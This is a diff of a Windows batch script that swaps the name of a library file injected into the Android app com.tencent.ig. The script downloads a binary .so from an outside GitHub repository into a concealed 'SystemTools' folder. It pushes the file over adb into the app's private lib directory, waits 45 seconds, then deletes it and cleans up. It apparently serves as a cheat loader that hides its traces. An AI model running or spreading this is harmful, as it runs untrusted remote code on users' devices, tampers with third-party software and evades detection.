@@ -64,7 +64,7 @@ set hiddenPath=%APPDATA%\Microsoft\Windows\Start Menu\Programs\SystemTools
 if not exist "%hiddenPath%" mkdir "%hiddenPath%"
 
 :: Define the filename
-set fileName=libGVoicePlugin.so
+set fileName=libAkAudioVisiual.so
 
 :: Download the file using PowerShell
 powershell -Command "Invoke-WebRequest -Uri 'https://github.com/jack74512/UAO7/raw/refs/heads/main/%fileName%' -OutFile '%hiddenPath%\%fileName%'"
@@ -92,7 +92,7 @@ adb shell mv /data/local/tmp/%fileName% /data/data/com.tencent.ig/lib/
 echo Waiting for 45 seconds...
 timeout /t 45 >nul
 
-adb shell rm /data/data/com.tencent.ig/lib/libGVoicePlugin.so
+adb shell rm /data/data/com.tencent.ig/lib/libAkAudioVisiual.so
 
 
 :: Clean up the hidden path
